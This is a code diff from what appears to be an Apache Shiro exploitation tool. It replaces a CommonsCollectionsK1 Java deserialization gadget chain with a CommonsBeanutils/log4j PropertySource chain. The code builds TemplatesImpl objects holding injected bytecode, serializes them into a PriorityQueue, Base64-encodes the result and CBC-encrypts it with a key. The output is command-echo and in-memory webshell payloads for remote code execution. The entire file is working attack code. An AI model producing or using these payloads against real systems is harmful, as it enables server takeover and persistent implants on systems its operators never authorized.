@@ -5,26 +5,21 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.y5neko.shiroexp.misc.Tools;
 import javassist.*;
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.logging.log4j.util.PropertySource;
 
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.Base64;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.PriorityQueue;
 
 /**
- * CommonsCollectionsK1 利用链
- * 使用 TiedMapEntry + LazyMap + InvokerTransformer 组合
+ * CommonsBeanutilsPropertySource 利用链
+ * 使用 log4j 的 PropertySource.Comparator 作为比较器
+ * 兼容 commons-beanutils 1.8.3
  */
-public class CommonsCollectionsK1 {
+public class CommonsBeanutilsPropertySource {
 
     /**
      * 反射设置字段值
@@ -36,10 +31,49 @@ public class CommonsCollectionsK1 {
     }
 
     /**
-     * 生成回显payload
+     * 构造 CBPropertySource 链 payload
+     * @param templatesImpl TemplatesImpl 对象
+     * @return 反序列化 payload
+     */
+    private byte[] getPayload(TemplatesImpl templatesImpl) throws Exception {
+        // 创建 PropertySource 匿名内部类实例
+        PropertySource propertySource1 = new PropertySource() {
+            @Override
+            public int getPriority() {
+                return 0;
+            }
+        };
+
+        // 创建 BeanComparator，使用 PropertySource.Comparator 作为比较器
+        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
+
+        // 创建 PriorityQueue
+        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
+
+        // 添加 PropertySource 对象
+        queue.add(propertySource1);
+        queue.add(propertySource1);
+
+        // 通过反射替换 queue 内容为 TemplatesImpl 对象
+        setFieldValue(queue, "queue", new Object[]{templatesImpl, templatesImpl});
+
+        // 修改 property 为 outputProperties 以触发 getter
+        setFieldValue(beanComparator, "property", "outputProperties");
+
+        // 序列化
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+
+    /**
+     * 生成回显 payload
      * @param echoType 回显类型
      * @param key 密钥
-     * @return 加密后的payload字符串
+     * @return 加密后的 payload 字符串
      */
     public static String genEchoPayload(String echoType, String key) throws Exception {
         ClassPool pool = ClassPool.getDefault();
@@ -77,46 +111,21 @@ public class CommonsCollectionsK1 {
         ctClass.setSuperclass(superClass);
 
         // 创建 TemplatesImpl 对象
-        TemplatesImpl templates = new TemplatesImpl();
-        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
-        setFieldValue(templates, "_name", "a");
-        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+        setFieldValue(templatesImpl, "_name", "a");
+        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
 
-        // CCK1 利用链核心
-        // 1. 创建初始 InvokerTransformer (方法名为 toString，后续会反射修改为 newTransformer)
-        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-
-        // 2. 创建 LazyMap，绑定 InvokerTransformer
-        HashMap<String, String> innerMap = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) transformer);
-
-        // 3. 创建 TiedMapEntry，绑定 LazyMap 和 TemplatesImpl
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
-
-        // 4. 创建 outer HashMap，将 TiedMapEntry 作为 key 放入
-        Map<Object, Object> outerMap = new HashMap<>();
-        outerMap.put(tied, "t");
-
-        // 5. 清空 innerMap（关键步骤，确保反序列化时触发）
-        innerMap.clear();
-
-        // 6. 反射修改 InvokerTransformer 的方法名为 newTransformer
-        setFieldValue(transformer, "iMethodName", "newTransformer");
-
-        // 序列化
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(outerMap);
-        oos.close();
-
-        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
+        // 生成反序列化 payload
+        byte[] payload = new CommonsBeanutilsPropertySource().getPayload(templatesImpl);
+        String data = Base64.getEncoder().encodeToString(payload);
         return Tools.CBC_Encrypt(key, data);
     }
 
     /**
-     * 生成内存马payload
+     * 生成内存马 payload
      * @param key 密钥
-     * @return 加密后的payload字符串
+     * @return 加密后的 payload 字符串
      */
     public static String genMemPayload(String key) throws Exception {
         ClassPool pool = ClassPool.getDefault();
@@ -136,33 +145,14 @@ public class CommonsCollectionsK1 {
         ctClass.setSuperclass(superClass);
 
         // 创建 TemplatesImpl 对象
-        TemplatesImpl templates = new TemplatesImpl();
-        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
-        setFieldValue(templates, "_name", "a");
-        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+        setFieldValue(templatesImpl, "_name", "a");
+        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
 
-        // CCK1 利用链核心
-        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-
-        HashMap<String, String> innerMap = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) transformer);
-
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
-
-        Map<Object, Object> outerMap = new HashMap<>();
-        outerMap.put(tied, "t");
-
-        innerMap.clear();
-
-        setFieldValue(transformer, "iMethodName", "newTransformer");
-
-        // 序列化
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(outerMap);
-        oos.close();
-
-        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
+        // 生成反序列化 payload
+        byte[] payload = new CommonsBeanutilsPropertySource().getPayload(templatesImpl);
+        String data = Base64.getEncoder().encodeToString(payload);
         return Tools.CBC_Encrypt(key, data);
     }
 }
